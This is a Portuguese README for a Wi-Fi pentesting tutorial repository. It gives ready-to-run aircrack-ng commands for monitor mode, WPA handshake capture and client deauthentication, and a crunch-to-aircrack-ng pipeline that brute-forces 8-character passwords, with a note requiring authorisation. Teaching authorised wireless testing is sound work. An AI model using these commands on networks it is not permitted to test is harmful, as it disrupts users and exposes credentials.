# Hackeando Redes Wireless de Forma Simples
Este repositório destina-se a fornecer conhecimento e práticas para testes de penetração (pentest) em redes wireless. Aqui, detalhamos o uso das ferramentas `aircrack-ng` e `crunch` para avaliar a segurança de redes Wi-Fi.

## Estrutura do Repositório

- [`aircrack-ng/`](aircrack-ng/): Contém informações detalhadas e exemplos de uso do Aircrack-ng.
- [`crunch/`](crunch/): Contém informações detalhadas e exemplos de uso do Crunch.
- [`exemplo-redteam/`](exemplo-redteam/): Exemplos de uma operação de Red Team utilizando as ferramentas mencionadas.

## Índice

- [Introdução](#introdução)
- [Instalação das Ferramentas](#instalação-das-ferramentas)
- [Preparação do Ambiente](#preparação-do-ambiente)
- [Captura de Handshake](#captura-de-handshake)
- [Quebra de Senha com Aircrack-ng e Crunch](#quebra-de-senha-com-aircrack-ng-e-crunch)
- [Considerações Legais e Éticas](#considerações-legais-e-éticas)
- [Recursos Adicionais](#recursos-adicionais)

## Introdução

Este guia foi criado para fornecer conhecimento e práticas para realizar testes de penetração em redes Wi-Fi de forma ética e legal. As ferramentas utilizadas incluem `aircrack-ng` para captura e quebra de senhas de redes Wi-Fi, e `crunch` para geração de listas de senhas personalizadas.

## Instalação das Ferramentas

### Aircrack-ng

Para instalar o Aircrack-ng em sistemas Debian/Ubuntu:

```bash
sudo apt-get install aircrack-ng
```

Mais detalhes podem ser encontrados na pasta [`aircrack-ng/`](aircrack-ng/README.md).

### Crunch

Para instalar o Crunch em sistemas Debian/Ubuntu:

```bash
sudo apt-get install crunch
```

Mais detalhes podem ser encontrados na pasta [`crunch/`](crunch/README.md).

## Preparação do Ambiente

1. **Habilitar Modo Monitor na Interface de Rede**

    ```bash
    sudo airmon-ng start [NOME DA PLACA]
    ```
    ![Modo monitor img](others/mode-monitor)

2. **Capturar Pacotes de Rede**

    ```bash
    sudo airodump-ng wlan0mon
    ```
    ![Dump All](others/dump-all)

    Identifique o BSSID e o canal da rede alvo para fazer uma análise focada.

3. **Focar na Rede Alvo e Capturar Handshake**

    ```bash
    sudo airodump-ng --bssid [BSSID] --channel [canal] --write log wlan0mon
    ```
    ![Dump Target](others/dump-esp)

5. **Forçar a Reautenticação de Clientes (Opcional)**

    ```bash
    sudo aireplay-ng --deauth 10 -a [BSSID] -c [CLIENTE_MAC] wlan0mon
    ```
    ![Deauther](others/deauth)
    ![Dump handshake](others/dump-handshake)

## Captura de Handshake

Verifique se o handshake foi capturado corretamente:

```bash
aircrack-ng log.cap
```
![Verify Arc](others/verify-cap)

## Quebra de Senha com Aircrack-ng e Crunch

Use o `crunch` para gerar senhas e passe-as diretamente para o `aircrack-ng` usando pipes (`|`):

```bash
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b [BSSID] log.cap
```
![Aircrack-ng](others/aircrack-ng)

### Parâmetros do Comando

- `crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789`: Gera todas as combinações possíveis de senhas com 8 caracteres usando letras minúsculas e dígitos.
- `|`: Pipe que redireciona a saída de `crunch` para o `aircrack-ng`.
- `-w -`: Indica que `aircrack-ng` deve ler a lista de senhas da entrada padrão (stdin).
- `-b [BSSID]`: Especifica o BSSID da rede alvo.
- `log.cap`: Arquivo de captura contendo a handshake.

## Considerações Legais e Éticas

> [!NOTE]
> O uso das ferramentas descritas neste guia deve ser restrito a redes para as quais você tem permissão explícita para realizar testes de segurança. O uso não autorizado dessas ferramentas é ilegal e antiético. Sempre obtenha permissão antes de realizar qualquer teste de penetração.

## Recursos Adicionais

- [Documentação do Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=getting_started)
- [Documentação do Crunch](https://tools.kali.org/password-attacks/crunch)

---

Este guia foi criado para fornecer conhecimento e práticas para realizar testes de penetração em redes Wi-Fi de forma ética e legal. Se tiver dúvidas ou sugestões, sinta-se à vontade para contribuir com este repositório.
